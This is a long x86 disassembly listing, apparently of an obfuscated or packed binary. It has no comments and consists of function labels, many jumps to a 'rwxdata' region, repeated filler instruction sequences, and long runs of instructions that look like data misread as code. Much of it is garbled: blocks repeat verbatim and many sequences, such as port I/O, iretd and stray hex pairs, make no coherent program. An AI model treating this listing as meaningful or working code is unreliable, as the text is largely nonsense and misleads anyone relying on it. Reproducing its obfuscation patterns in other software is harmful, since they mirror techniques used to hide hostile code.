ror si cl
btc esi esp
mov esi edi
stc
call sub_101d929d
test bl dh
call sub_101be430
cli
push esi
sub [ edx ] cl
xor al 0x7f
pushad
mov eax [ 0x5e0a74cc ]
0xa151a44 0x1ee7
bts dx 0x2
xor eax eax
jge rwxdata
mov dh dl
jmp sub_101bdeb6
mov dl 0x4f
pop edx
xchg si di
pop ebx
xchg di si
mov si sp
push edi
call sub_101bba70
sub_101d7660
cmp [ ebp + 0x14 ] ecx
pushfd
push [ esp ]
pushad
lea esp [ esp + 0x30 ]
ja rwxdata
rcr ch 0x3
test sp 0x654e
mov ecx [ esi + 0x4 ]
push edi
mov [ esp ] dx
or ecx ecx
call sub_101bc663
sbb [ 0xffffffffa35e412a ] dh
sbb ebp [ esi + esi * 2 ]
imul ebp [ ebp + 0x64e41d6e ] 0xb42a6857
cmp eax 0xe6b867c8
mov eax 0xa897bcc2
push esi
dec ecx
lds ebx [ ecx - 0xf ]
lodsd [ esi ]
or ebp esi
xor [ cs : ecx ] ebx
inc esi
push edi
xchg esp eax
stosb [ edi ]
mov ebx 0x820e9d61
mov [ 0xffffffffacb3b5ec ] eax
in eax dx
int1
fistp [ esi + esi * 8 ]
inc eax
arpl [ edx + 0x4c ] si
pop ebp
salc
outsd
iretd
lea esi [ ecx + 0x598c80ea ]
push 0xb3bdfbb3
setle bh
mov esi [ esp + 0x4 ]
movsx bx cl
xchg di cx
mov edi [ esp + 0x8 ]
pop ecx
mov ebx [ esp + 0x8 ]
push [ esp + 0x4 ]
call sub_101be33f
jns rwxdata
rol eax cl
pop esi
popad
aad 0xa9
mov edx 0xe739e8b7
in al 0x65
jecxz rwxdata
or dh cl
outsd
adc bl ah
int3
pop ss
test bl bh
dec edi
dec edi
loopne rwxdata
scasd [ edi ]
enter 0x8b17 0x53
outsd
dec edi
pop es
push edi
0x5f1c036b 0x7640
mov [ ebp - 0x57 ] dl
0x19a5203e 0x6d2a
sub_101d77c5
mov [ esp ] 0xf1
add edi eax
pushfd
stc
jmp rwxdata
bt bx ax
mov edi [ edi + ecx * 4 ]
jmp rwxdata
test edi ebx
test edi edi
push edi
push ebp
lea esp [ esp + 0x20 ]
je rwxdata
bts dx 0x2
xor eax eax
jge rwxdata
cmc
pushfd
stc
clc
add eax edi
mov [ esp ] 0x47
jmp rwxdata
mov dh dl
jmp sub_101bdeb6
mov dl 0x4f
pop edx
xchg si di
pop ebx
xchg di si
mov si sp
push edi
call sub_101bba70
mov [ esp ] esi
fidivr [ ebx + eax * 8 + 0x31 ]
aam 0x3f
lahf
ja rwxdata
les esp [ edx ]
mov esp 0xe01ea897
add edi [ ebx + ecx * 4 - 0x64b8680c ]
pop ebp
adc [ edx - 0x237e9fc1 ] 0x8778290b
xchg edi eax
fsub [ ebp + 0x34 ]
test ch dl
popad
pop ebp
adc [ edx - 0x6cf3566c ] 0xd733732c
popad
cmp al [ ebp + 0x56 ]
sub [ edx ] esi
dec ebp
pop esi
inc edi
pop ds
bound edx [ eax - 0x45 ]
inc esp
fcmovb st4
enter 0xff36 0x3f
push cs
jo rwxdata
jpo rwxdata
xchg ebx eax
sub al 0x73
xor edx edi
mov ecx 0xc5e7bdd
add [ ebp + 0x5e ] 0x81
cmp [ esi - 0xc38849 ] ah
aas
pop esp
and esi [ ecx * 4 - 0x6babc47d ]
xlat
cmpsd [ esi ] [ edi ]
test [ edi ] 0xe2
and edi [ esi - 0x259c8ea0 ]
jmp rwxdata
xchg esp eax
js rwxdata
cmp eax edx
call sub_101bba4f
cwde
fldenv [ esi + 0x7ba3aad4 ]
mov [ ecx ] ds
in eax 0x58
push es
lds edx [ esp + esi ]
pop ax
fisub [ esp + ecx * 8 + 0x39 ]
cmp [ gs : edx + 0x421d6d15 ] ebp
xchg esi eax
mov edx [ ebx - 0x481f005c ]
sub dh [ edx + 0x4f ]
imul esp [ edi - 0x229932ee ] 0x1b
inc ebp
xchg [ eax + 0x47 ] esi
sub [ edx - 0x23 ] 0x33
lodsb [ esi ]
xlat
dec ebp
les ebx [ edx - 0x50 ]
das
mov bh 0x8
add eax 0x5e714df9
shl [ eax - 0x767f6021 ] cl
xor al 0x24
xor ebp [ edi + edx * 8 - 0x6587986c ]
sub_101d797b
mov [ esp ] 0x4a
stosb [ edi ]
mov [ esp ] bl
pushfd
pushfd
lea esp [ esp + 0xc ]
jmp rwxdata
pushad
jmp rwxdata
pushfd
pushfd
lea esp [ esp + 0x28 ]
call j_sub_101cb5d7
pushfd
push [ esp ]
lea esp [ esp + 0x8 ]
jae rwxdata
pushad
mov [ esp + 0x10 ] 0x9e
lodsb [ esi ]
rcl bl cl
sub al 0xf8
not bl
setge bl
ror al 0x1
not bl
setno bl
not al
dec bl
shr bl cl
xor al 0xbe
sbb bl dh
push [ esp ]
ror bl cl
jmp rwxdata
cmc
stc
bt ecx ebp
jmp rwxdata
neg al
not bl
pushfd
setne bl
mov bl ah
stosb [ edi ]
jmp rwxdata
xor ecx ecx
jmp rwxdata
push 0xd9d35aa3
mov bl 0x2
lea esp [ esp + 0x2c ]
jmp rwxdata
call j_sub_101cb5d7
jmp j_sub_101d1d2f
sub_101d7a36
call sub_101d5154
cmp eax 0x3b645ba3
pushad
pop ds
pushad
and [ ebp + 0x4c9419d8 ] edi
cld
dec ebx
adc ebp [ edi + 0x242f900f ]
sbb eax [ edx + 0x40c7d783 ]
lahf
adc al 0xcb
scasd [ edi ]
iretd
sub_101d833c
test cx 0xfaea
test si 0xbd02
add edx eax
mov [ esp ] 0xa8
push 0x1b0a0832
mov [ esp ] cl
pushfd
lea esp [ esp + 0x10 ]
jmp rwxdata
mov al al
adc al bh
add edi 0x1
rcr al 0x1
push 0xae313a6d
inc al
add al 0x97
mov al [ edi ]
test bh ah
test al al
push 0x8f16e632
lea esp [ esp + 0x8 ]
je rwxdata
rcr al 0x6
shld ecx ebp cl
mov edi edx
and ecx 0xe1443ac4
jmp rwxdata
clc
clc
stc
sub al 0x30
bt bx si
stc
jmp rwxdata
mov ecx edi
test cl 0x74
add al 0xdb
mov al [ ecx ]
push 0x995b44fd
call sub_101d77ba
imul dh
xor [ esi ] bh
xor [ esi - 0x2a795038 ] 0xa0
cmp [ edi ] ecx
and ebx [ ebx - 0x42d6e984 ]
and [ ecx + edi * 2 - 0x7a656ab6 ] ecx
inc ecx
mov ebp 0xf965ad72
adc eax 0x15f92609
or esp edi
inc edx
push ebx
lea edx [ ecx - 0x18115000 ]
0x8c732e26 0xa392
cmp al 0x9
pushfd
call sub_101c99ba
shr al 0x3
ror al 0x2
rcr ah cl
mov eax [ ebp - 0x8 ]
test ch 0x99
test esi eax
cmp ah 0x5
cmc
shl eax 0x1
call sub_101bdee6
pushfd
lea edi [ ebx - 0x47c248e ]
movzx esi [ edx + 0x1a ]
pushfd
bswap di
lea esi [ esi + edx + 0x1c ]
jmp rwxdata
pushad
mov edi [ ebp + 0x8 ]
pushfd
call sub_101d96a1
push 0xe5bfe2b4
cmp al 0x9
pushad
lea esp [ esp + 0x24 ]
ja rwxdata
pushad
mov [ esp ] 0x8
mov [ esp + 0x4 ] 0x7e
push edi
mov esp esi
pushfd
lea esp [ esp + 0x4 ]
jmp rwxdata
stc
imul edx edx 0xa
jmp rwxdata
bts dx 0x2
xor eax eax
jge rwxdata
jmp rwxdata
mov dh dl
jmp sub_101bdeb6
mov dl 0x4f
pop edx
xchg si di
pop ebx
xchg di si
mov si sp
push edi
call sub_101bba70
add edx eax
push 0x642b6212
push 0x3ff1ecec
mov [ esp + 0x4 ] bx
lea esp [ esp + 0x8 ]
jmp rwxdata
sub_101d8368
cmp dh 0x9
call sub_101cf481
neg dh
or dx 0xdc8d
push ebp
cmc
mov ebp esp
bsf dx dx
push eax
sar dl cl
push ecx
bsr dx di
shld edx ecx 0x14
bswap edx
bsf ecx edi
push ebx
call sub_101cf752
sub_101d8673
push ebp
lea esp [ esp + 0x8 ]
jg rwxdata
pushfd
call sub_101d54bd
call sub_101bc637
push esp
pop edx
fld [ esi + 0x47e692ac ]
push edx
pop ebp
add al [ esi + 0x25 ]
pop ecx
cmpsb [ esi ] [ edi ]
cdq
loop rwxdata
pushad
lea esp [ esp + 0x20 ]
ja rwxdata
stosb [ edi ]
jne rwxdata
cdq
lds ecx [ ecx - 0x2b ]
or [ esi + 0x1a65e2fc ] dl
mov [ esi + 0x6c ] dl
push edx
add al 0x5a
adc [ esi + 0x3928b763 ] ecx
pushad
mov [ esp ] 0x8
mov [ esp + 0x4 ] 0x7e
push edi
mov esp esi
pushfd
lea esp [ esp + 0x4 ]
jmp rwxdata
push 0xd98113ae
imul edx edx 0xa
push 0x9357dc0
call sub_101bf15b
dec esi
xor [ edx + 0x71 ] esi
pop edi
out dx eax
mov [ 0x10f5ed ] al
add [ ebx + 0x6f ] al
inc ebx
jb rwxdata
pop edx
push 0x4e201f37
bts dx 0x2
xor eax eax
jge rwxdata
aam 0xac
adc cl ah
cmp edx [ esi + ebp * 4 ]
popad
je rwxdata
mov dh dl
jmp sub_101bdeb6
mov dl 0x4f
pop edx
xchg si di
pop ebx
xchg di si
mov si sp
push edi
call sub_101bba70
dec eax
pop ds
mov ebp 0xb115aa7a
aas
add eax 0xc5408d39
mov al [ 0x4a57a4fb ]
scasb [ edi ]
or ch bh
in al 0xf9
push edx
not [ esi ]
dec esp
pop esp
cdq
fisub [ esi + 0x627c8764 ]
push ecx
or eax 0x4f13646e
cmpsd [ esi ] [ edi ]
sbb cl dl
or eax 0xe43a2996
mov [ ecx ] 0x431cf69e
js rwxdata
int3
dec ecx
outsb
jae rwxdata
jmp 0x7c99d60a
pop esp
0xe175e945 0x6c7d
jb rwxdata
fldenv [ ebp + 0x76 ]
test [ esi + ebx + 0x2d ] dl
or [ edx ] ebx
and al 0x35
sti
movsb [ edi ] [ esi ]
push edi
dec edx
popad
outsb
arpl [ ebp ] sp
mov dl 0x90
jno rwxdata
add [ ebx - 0x5609368a ] dh
aad 0xe9
cli
mov edi 0x5f36cf20
inc eax
push edx
mov al 0x19
in al dx
mov [ 0xffffffffaa09161c ] eax
je rwxdata
jpo rwxdata
jb rwxdata
adc al 0xae
mov al [ 0x7a259d01 ]
sbb esp [ ebx - 0x52cd6b96 ]
inc edi
mov esi 0x136bcfb0
salc
or [ ecx ] bl
jno rwxdata
stc
in al dx
push edi
sbb [ ebx + 0x6f ] 0xffffff8a
push esp
pop ds
cmp ebx eax
mov al 0x7
inc ebx
push cs
0x281ff48e 0x98ad
xchg [ ebx ] dh
dec ebx
call 0x23e74859
xchg [ ebx - 0x2d ] ebp

fldcw [ edi + 0x20 ]
jle rwxdata
out dx al
sti
xchg esp eax
xor ch [ 0x3253e8f8 ]
add [ eax ] eax
mov bl 0x76
leave
imul [ ecx - 0x4005162b ]
and bh cl
pop edi
iretd
shr ebp 0x1
jno rwxdata
aad 0x35
stosb [ edi ]
shr [ ebx - 0x12a08f00 ] cl
adc al 0x7b
xor eax 0xfac5f46a
pushad
mov al [ 0xfffffffff83daf9e ]
mov edx 0xa8b70f39
bound ebx [ esi + esi * 2 + 0x5cd46be8 ]
test eax 0x11c1add1
mov ds [ edi + 0x7e54fce2 ]
and [ edx ] esi
xchg esp eax
inc ecx
jge rwxdata
outsd
scasd [ edi ]
fwait
sub eax [ ebx - 0x24 ]
mov edi 0x599847c0
lodsb [ esi ]
cmpsd [ esi ] [ edi ]
cwde
jpo rwxdata
jmp rwxdata
call esi
call 0xffffffff9373e256
pop ebx
outsd
mov dl [ edi + ebx + 0x3b ]
fdiv [ eax - 0x15f1bcf9 ]
sub_101d8858
lea esp [ esp + 0x14 ]
je rwxdata
rcr al 0x6
shld ecx ebp cl
mov edi edx
and ecx 0xe1443ac4
jmp rwxdata
cmc
sub al 0x30
pushfd
cmp al 0x9
call sub_101bfa18
add al 0x6d
adc bl ah
bound ebx [ eax ]
ja rwxdata
mov ecx edi
test cl 0x74
add al 0xdb
mov al [ ecx ]
push 0x995b44fd
call sub_101d77ba
imul dh
xor [ esi ] bh
xor [ esi - 0x2a795038 ] 0xa0
cmp [ edi ] ecx
and ebx [ ebx - 0x42d6e984 ]
and [ ecx + edi * 2 - 0x7a656ab6 ] ecx
inc ecx
mov ebp 0xf965ad72
adc eax 0x15f92609
or esp edi
inc edx
push ebx
lea edx [ ecx - 0x18115000 ]
0x8c732e26 0xa392
fucom st2
mov ebp 0x3fdf9ee1
insb
mov bh 0x68
xor [ edi + 0x14 ] 0x47af109
xor cl [ ecx + esi + 0x4d ]
pop esi
cld
mov [ 0xfffffffffc0e545a ] eax
xchg ebx eax
stc
xchg [ ebx + ebx * 2 + 0x491544fb ] al
in al dx
push edx
loopne rwxdata
les ebp [ esi + eax + 0x2b ]
mov [ edi + 0x1de84897 ] edi
movsd [ edi ] [ esi ]
sbb ebp ecx
adc ecx edi
add eax 0xf529e5ba
or al 0xb2
jecxz rwxdata
sub ecx [ ecx - 0x17b76841 ]
sbb eax 0x11cd19a5
stc
cmpsd [ esi ] [ edi ]
sbb [ ecx - 0x77f52beb ] cl
pop ss
lodsd [ esi ]
pop eax
insd
push ecx
cwde
inc esi
fwait
jno rwxdata
inc eax
pop esi
and [ edx + 0x41 ] esp
les esi [ edi - 0x7e42ef10 ]
imul [ esi ]
ror cl 0xbf
fninit
fstp st7
xchg ebx eax
mov eax [ edi ]
xlat
les edi [ ebx - 0x4f02433e ]
iretd
xlat
enter 0xc626 0xbe
call 0xffffffffafce878e
xchg esp eax
in eax 0x51
add [ ebp - 0x72 ] edi
pop edx
jns rwxdata
sahf
loopne rwxdata
adc [ ebp - 0x3fd1097f ] bh
leave
mov edi 0xdfdfe3db
std
inc edx
mov al 0x6c
cmc
stc
in al 0xb6
or [ ebp + 0x14f6e801 ] bh

xor [ esp + edi + 0x71abe809 ] bl
mov [ 0x529dccbd ] al
jmp rwxdata
jmp rwxdata
mov [ esp ] 0xeb
mov [ esp ] 0x7f6aca92
pushfd
jmp rwxdata
push esp
call sub_101c8658
sub_101d8988
sub edi 0x4
cmc
push [ edi ]
pop [ esp + 0x1c ]
push [ esp ]
pushfd
cmp al al
stc
cmp edi ebx
pushfd
pushfd
jmp rwxdata
mov [ esp ] 0xc5
lea esp [ esp + 0x2c ]
ja rwxdata
cmc
bt ax 0x2
pushad
stc
sub edi 0x4
pushad
clc
push [ edi ]
pop [ esp + 0x3c ]
test al 0x15
pushfd
stc
cmc
cmp edi ebx
jmp rwxdata
sar al cl
sub ebx edi
clc
adc al 0x3a
add ebx esp
bts di sp
mov di 0xfbe1
bsr di dx
lea edi [ eax * 4 + 0x32d2df51 ]
mov edi ebx
mov al 0x7f
shl al cl
mov al 0x2e
push 0x4ba2930
test si 0xd5ec
cmc
[ edi ]
push edx
jmp rwxdata
pushfd
call sub_101be1d9
call sub_101bc637
push esp
pop edx
fld [ esi + 0x47e692ac ]
push edx
pop ebp
add al [ esi + 0x25 ]
pop ecx
cmpsb [ esi ] [ edi ]
cdq
loop rwxdata
stosb [ edi ]
jne rwxdata
cdq
lds ecx [ ecx - 0x2b ]
or [ esi + 0x1a65e2fc ] dl
mov [ esi + 0x6c ] dl
push edx
add al 0x5a
adc [ esi + 0x3928b763 ] ecx
dec esi
xor [ edx + 0x71 ] esi
pop edi
out dx eax
mov [ 0x10f5ed ] al
add [ ebx + 0x6f ] al
inc ebx
jb rwxdata
pop edx
push 0x4e201f37
aam 0xac
adc cl ah
cmp edx [ esi + ebp * 4 ]
popad
je rwxdata
dec eax
pop ds
mov ebp 0xb115aa7a
aas
add eax 0xc5408d39
mov al [ 0x4a57a4fb ]
scasb [ edi ]
or ch bh
in al 0xf9
push edx
not [ esi ]
dec esp
pop esp
cdq
fisub [ esi + 0x627c8764 ]
push ecx
or eax 0x4f13646e
cmpsd [ esi ] [ edi ]
sbb cl dl
or eax 0xe43a2996
mov [ ecx ] 0x431cf69e
js rwxdata
int3
dec ecx
outsb
jae rwxdata
jmp 0x7c99d60a
pop esp
0xe175e945 0x6c7d
jb rwxdata
fldenv [ ebp + 0x76 ]
test [ esi + ebx + 0x2d ] dl
or [ edx ] ebx
and al 0x35
sti
movsb [ edi ] [ esi ]
push edi
dec edx
popad
outsb
arpl [ ebp ] sp
pushfd
call sub_101d54bd
mov dl 0x90
jno rwxdata
add [ ebx - 0x5609368a ] dh
aad 0xe9
cli
mov edi 0x5f36cf20
inc eax
push edx
mov al 0x19
in al dx
mov [ 0xffffffffaa09161c ] eax
je rwxdata
jpo rwxdata
jb rwxdata
adc al 0xae
mov al [ 0x7a259d01 ]
sbb esp [ ebx - 0x52cd6b96 ]
inc edi
mov esi 0x136bcfb0
salc
or [ ecx ] bl
jno rwxdata
stc
in al dx
push edi
sbb [ ebx + 0x6f ] 0xffffff8a
push esp
pop ds
cmp ebx eax
mov al 0x7
inc ebx
push cs
0x281ff48e 0x98ad
xchg [ ebx ] dh
dec ebx
call 0x23e74859
xchg [ ebx - 0x2d ] ebp

fldcw [ edi + 0x20 ]
jle rwxdata
out dx al
sti
xchg esp eax
xor ch [ 0x3253e8f8 ]
add [ eax ] eax
mov bl 0x76
leave
imul [ ecx - 0x4005162b ]
and bh cl
pop edi
iretd
shr ebp 0x1
jno rwxdata
aad 0x35
stosb [ edi ]
shr [ ebx - 0x12a08f00 ] cl
adc al 0x7b
xor eax 0xfac5f46a
pushad
mov al [ 0xfffffffff83daf9e ]
mov edx 0xa8b70f39
bound ebx [ esi + esi * 2 + 0x5cd46be8 ]
test eax 0x11c1add1
mov ds [ edi + 0x7e54fce2 ]
and [ edx ] esi
xchg esp eax
inc ecx
jge rwxdata
outsd
scasd [ edi ]
fwait
sub eax [ ebx - 0x24 ]
mov edi 0x599847c0
lodsb [ esi ]
cmpsd [ esi ] [ edi ]
cwde
jpo rwxdata
jmp rwxdata
call esi
call 0xffffffff9373e256
pop ebx
outsd
mov dl [ edi + ebx + 0x3b ]
fdiv [ eax - 0x15f1bcf9 ]
sub_101d89a2
call sub_101b8c64
scasd [ edi ]
vpsubsw xmm2 xmm4 xmm5
sbb [ 0x4598e766 ] esp
and edi 0x71
xlat
sub dh dh
sbb esi 0x4abb3648
fsub st7
fadd st7
pop ds
inc edi
clc
cmp [ eax ] esi
and ebp 0x76
sub [ ebx + 0x40 ] esp
mov ebx 0x4956aa8f
0x93980659 0xc3f4
sub_101d8c73
lea esp [ esp + 0x30 ]
jne rwxdata
pushad
mov [ esp ] 0x8
mov [ esp + 0x4 ] 0x7e
push edi
mov esp esi
pushfd
lea esp [ esp + 0x4 ]
jmp rwxdata
call sub_101d27c7
bts dx 0x2
xor eax eax
jge rwxdata
add edx eax
push 0x642b6212
push 0x3ff1ecec
mov [ esp + 0x4 ] bx
lea esp [ esp + 0x8 ]
jmp rwxdata
mov dh dl
jmp sub_101bdeb6
mov dl 0x4f
pop edx
xchg si di
pop ebx
xchg di si
mov si sp
push edi
call sub_101bba70
mov al al
adc al bh
add edi 0x1
rcr al 0x1
push 0xae313a6d
inc al
add al 0x97
mov al [ edi ]
test bh ah
test al al
push 0x8f16e632
lea esp [ esp + 0x8 ]
je rwxdata
rcr al 0x6
shld ecx ebp cl
mov edi edx
and ecx 0xe1443ac4
jmp rwxdata
clc
clc
stc
sub al 0x30
bt bx si
stc
jmp rwxdata
mov ecx edi
test cl 0x74
add al 0xdb
mov al [ ecx ]
push 0x995b44fd
call sub_101d77ba
imul dh
xor [ esi ] bh
xor [ esi - 0x2a795038 ] 0xa0
cmp [ edi ] ecx
and ebx [ ebx - 0x42d6e984 ]
and [ ecx + edi * 2 - 0x7a656ab6 ] ecx
inc ecx
mov ebp 0xf965ad72
adc eax 0x15f92609
or esp edi
inc edx
push ebx
lea edx [ ecx - 0x18115000 ]
0x8c732e26 0xa392
cmp al 0x9
pushfd
call sub_101c99ba
shr al 0x3
ror al 0x2
rcr ah cl
mov eax [ ebp - 0x8 ]
test ch 0x99
test esi eax
cmp ah 0x5
cmc
shl eax 0x1
call sub_101bdee6
pushfd
lea edi [ ebx - 0x47c248e ]
movzx esi [ edx + 0x1a ]
pushfd
bswap di
lea esi [ esi + edx + 0x1c ]
jmp rwxdata
pushad
mov edi [ ebp + 0x8 ]
pushfd
call sub_101d96a1
push 0xe5bfe2b4
cmp al 0x9
pushad
lea esp [ esp + 0x24 ]
ja rwxdata
stc
imul edx edx 0xa
jmp rwxdata
jmp rwxdata
sub_101d8c87
lea esp [ esp + 0x8 ]
jb rwxdata
clc
cmc
pushfd
cmp ecx [ ebp - 0x8 ]
pushfd
lea esp [ esp + 0x8 ]
jbe rwxdata
clc
cmp [ edi - 0x1 ] 0x0
push 0x6004cf60
pushad
lea esp [ esp + 0x24 ]
jne rwxdata
bts dx 0x2
xor eax eax
jge rwxdata
sbb di bx
shld di bx 0x5
sbb si 0x7d95
inc si
sub ecx 0x1
xor di 0xafff
sbb di cx
bsr si ax
jmp rwxdata
push eax
mov [ esp ] eax
call sub_101d12b7
bsr di si
rol edi cl
movsx di bl
sub edi 0x6cf7610a
mov edi [ edx + 0x24 ]
stc
add edi eax
push 0x70b2a3a
cmc
cmp bp 0xf2a5
movzx ecx [ edi + ecx * 2 ]
sub di 0x4d6
shl di cl
shld di bp 0x4
mov edi [ edx + 0x1c ]
clc
add edi eax
call sub_101d3d95
mov dh dl
jmp sub_101bdeb6
mov dl 0x4f
pop edx
xchg si di
pop ebx
xchg di si
mov si sp
push edi
call sub_101bba70
mov [ ebp - 0x4 ] ecx
inc esi
xchg cx di
mov ecx [ ebp - 0x8 ]
bt di 0x1
clc
shl di cl
rcr si 0x4
add ecx [ ebp - 0x4 ]
rol si 0x3
bts esi ecx
adc di ax
shr ecx 0x1
shl si cl
mov edi [ ebx + ecx * 4 ]
lea esi [ ebp * 8 - 0x260f86e7 ]
add edi eax
lea esi [ ebp * 8 - 0x6b10bcf9 ]
jmp rwxdata
jmp sub_101d52df
sub_101d8ce3
lea esp [ esp + 0x24 ]
ja rwxdata
rcr ch 0x3
test sp 0x654e
mov ecx [ esi + 0x4 ]
push edi
mov [ esp ] dx
or ecx ecx
call sub_101bc663
sbb [ 0xffffffffa35e412a ] dh
sbb ebp [ esi + esi * 2 ]
imul ebp [ ebp + 0x64e41d6e ] 0xb42a6857
cmp eax 0xe6b867c8
mov eax 0xa897bcc2
push esi
dec ecx
lds ebx [ ecx - 0xf ]
lodsd [ esi ]
or ebp esi
xor [ cs : ecx ] ebx
inc esi
push edi
xchg esp eax
stosb [ edi ]
mov ebx 0x820e9d61
mov [ 0xffffffffacb3b5ec ] eax
in eax dx
int1
fistp [ esi + esi * 8 ]
inc eax
arpl [ edx + 0x4c ] si
pop ebp
salc
outsd
iretd
xchg di bx
pushad
push ecx
mov esi [ esp + 0x24 ]
movzx bx dl
jmp sub_101d83a2
sub_101d8d0e
call sub_101b837c
call sub_101c58b9
or eax eax
call sub_101d1d5d
and eax 0x77873fe0
dec ebx
jae rwxdata
clc
add edi eax
call sub_101d3d95
sbb [ 0x28f9ced7 ] esp
and [ ebx + edx - 0x74 ] ch
xor eax [ ebx + ebx + 0x3f ]
pop edi
mov al [ 0x4b7f209f ]
sar [ ebx ] cl
jecxz rwxdata
xchg edi ebx
pushad
push ecx
mov esi [ esp + 0x24 ]
movzx bx dl
jmp sub_101d83a2
das
sub [ edi + 0x20 ] dl
aas
das
sub_101d91fe
pushfd
pushad
lea esp [ esp + 0x30 ]
call j_sub_101cb5d7
jmp rwxdata
pushad
lea esp [ esp + 0x20 ]
jb rwxdata
jmp sub_101cf4a6
pushad
pushfd
pushfd
pushfd
push [ esp + 0x2c ]
retn 0x30
sub_101d929d
lea esp [ esp + 0x24 ]
jne rwxdata
test bl dh
call sub_101be430
cli
push esi
sub [ edx ] cl
xor al 0x7f
pushad
mov eax [ 0x5e0a74cc ]
0xa151a44 0x1ee7
sub esi eax
call sub_101bfdf2
retn 0x300f
sub_101d965b
setle cl
mov ebx [ esp + 0x30 ]
call sub_101bc357
push edi
not ebx
mov ebx [ esp + 0x4 ]
pop esi
pop edi
lea esi [ ebp * 8 + 0x50f35bcb ]
pop edi
pushad
push [ esp ]
mov esi [ esp + 0x24 ]
mov [ esp + 0x4 ] 0xf8
jmp rwxdata
mov esp ebp
push edx
pop ebp
mov ebp esp
pop ebp
pushfd
mov [ esp ] 0xb6
mov [ esp ] 0x75
pushad
push [ esp + 0x24 ]
retn 0x30
sub_101d96a1
lea esp [ esp + 0x38 ]
call sub_101d8396
push esp
push esp
mov [ esp ] 0x95
call sub_101c6d40
push es
fiadd [ eax - 0x5a ]
cmp bh dh
sub [ ebp + 0x3c ] bh
mov [ 0x66d7d336 ] eax
loop rwxdata
xchg [ ebx + 0x32 ] bl
dec esp
aad 0xae
out 0x6e al

stc
adc ebp ebp
ror ch cl
and al 0xe1
mov esi 0x2e057901
xor [ edx - 0x7a0d72b3 ] edx
fidiv [ edx + ebp * 8 ]
arpl [ ebx + 0x4cd9c856 ] di
add al 0xa
xor al 0x97
call 0xffffffffad164046
mov [ 0xffffffffd5407bf7 ] eax
test al 0x8e
jno rwxdata
dec [ ebp - 0x17c7db9c ]
in al dx
in al dx
mov esi 0x48f6f846
mov al 0xb6
mov edx ecx
dec ebx
xor esp [ eax ]
xor ebx [ edx - 0x9e0f1f0 ]
mov bl al
mov [ edx + edx * 4 + 0x6f ] ss
shr [ esi + edx * 2 ] cl
sub_101e3f41
push [ esp ]
test dh 0x54
push [ edi ]
pop [ esp + 0x4 ]
cmc
cmp edi ebx
jmp rwxdata
mov [ esp ] di
mov [ esp ] ch
lea esp [ esp + 0x4 ]
cmc
bt ax 0x2
pushad
stc
sub edi 0x4
pushad
clc
push [ edi ]
pop [ esp + 0x3c ]
test al 0x15
pushfd
stc
cmc
cmp edi ebx
jmp rwxdata
xor al 0x64
sub ebx edi
call sub_1020d90d
add [ eax ] al
inc edi
je rwxdata
pushfd
call sub_101be1d9
rcr [ edx - 0x9195ae7 ] 0x28
adc [ edi ] 0x67
sbb [ edi - 0x36414c5f ] al
push edx
jo rwxdata
outsd
jne rwxdata
xor [ esi + 0x65c49a68 ] dh
stc
cmc
dec ecx
jpe rwxdata
pop es
dec eax
popad
outsb
sahf
cmpsb [ esi ] [ edi ]
in eax dx
mov ebx 0xc8d7bb24
sbb eax 0x5277eafc
test eax 0x23ac8675
clc
fsubr st7
add al 0x5a
sub al [ edi ]
test eax 0xcb73bf80
inc edi
pop ss
sub al cl
loop rwxdata
call sub_101bf9ae
xlat
jno rwxdata
mov ebp 0x8f5a6581
dec edi
pop es
cmp [ ecx + 0x71 ] cl
pop ebx
inc ebp

jo rwxdata
ja rwxdata
and al 0x8d
and al 0x4
pushfd
inc [ eax - 0x4bae5fe1 ]
dec edx
push ebp
mov ch 0x49
insd
xchg ecx eax
jbe rwxdata
pop ebx
inc esp
pushfd
pop ss
daa
xlat
loop rwxdata
xor eax 0xa5b5a969
stc
pop edx
in eax 0xe0
fsubp st7
jbe rwxdata
movsd [ edi ] [ esi ]
fidiv [ ebx ]

stc
cwde
test eax 0xe3718b73
xchg edx eax
xchg ecx eax
adc bh cl
iretd
shl [ 0xffffffff93ba7925 ] 0x1
in al dx
adc bh cl
or eax 0xc8772b1d
scasd [ edi ]
mov al 0xa6
mov eax 0xd0eed40b
push esi
sub dh ah
cmp bh dh
sub [ ebx + 0x4c ] dl
push edx
dec esp
mov bl 0x8c
push edi
push 0xa69e5d81
insb
inc ecx
add [ eax + ebp * 8 - 0x4a3f3 ] bl
ficom [ eax ]
push cs
in eax 0xd6
out 0x7e al
sub_101e4617
neg al
push 0x78142b3
not al
cmc
pushfd
mov [ esp + 0x4 ] cl
ror al 0x7
cmp bh 0x75
pushfd
mov [ esp ] 0x8fce08aa
pushfd
sub al 0x2b
jmp rwxdata
pushfd
mov [ esp ] 0x18
neg al
cmc
mov [ 0xffffffffa1b64805 ] al
pop ss
push ebx
jpo rwxdata
jbe rwxdata
pop esp
cmp [ ebx ] 0x4c
test eax 0x131c23a2
pop eax
int 0x12
and edx [ edx + 0x4a09b62d ]
jg rwxdata
scasb [ edi ]
dec edx
push esi
add al 0x9a
stosd [ edi ]
push 0x14
nop
stosb [ edi ]
jpo rwxdata
inc esp
aad 0x17
jns rwxdata
xor cl ah
faddp st7
jns rwxdata
mov [ 0x1b16fba ] eax
or eax 0x2c0af05c
push 0x5a7c2798
in eax dx
pop edx
in eax 0x78
add al 0xcf
sbb [ edx - 0x2c6db233 ] ch
popfd
adc ah [ ebx ]
xchg edx eax
sub eax 0xae4a09b6
psubq mmx0 [ ebx + 0x13 ]
dec ebx
in eax 0x20
push edi
or [ edx - 0x1c8b34bc ] bl
pushfd
mov edx 0x36948ba4
call 0x40cb71c7
stosb [ edi ]
xor eax 0x4d0cd346
int1
mov edi 0x25ffa200
0xd54433ac 0x7917
lahf
bt esp esi
mov [ ecx ] al
push 0x9c9d1a9
call sub_1020caea
je rwxdata
adc eax 0x1fa04638
lds ebx [ ecx - 0x79a08e56 ]
push ebx
cmp al 0x74
sub ebx [ esi + eax * 8 - 0x9e7dbfc ]
fdiv st5
xchg edi eax
jmp [ 0x4433ac9a ]
0x6f5
sub_101e472a
lea esp [ esp + 0x4 ]
ja rwxdata
cmp ax 0x4037
stc
pushfd
or al al
pushfd
lea esp [ esp + 0x8 ]
je rwxdata
push edi
bt bp 0x6
add ah 0x20
clc
test dx bp
or al al
pushad
lea esp [ esp + 0x24 ]
je rwxdata
push 0xc5f88448
mov [ esp ] 0xed25
test sp 0x9ab3
bt di 0x4
or ah ah
jmp j_sub_101bc751
jmp rwxdata
cmp cx 0x59aa
pushad
test dh ah
cmp al ah
jmp rwxdata
test cx dx
pushad
test bl 0x6
cmp al ah
mov [ esp + 0x1c ] bl
lea esp [ esp + 0x20 ]
jg rwxdata
pushfd
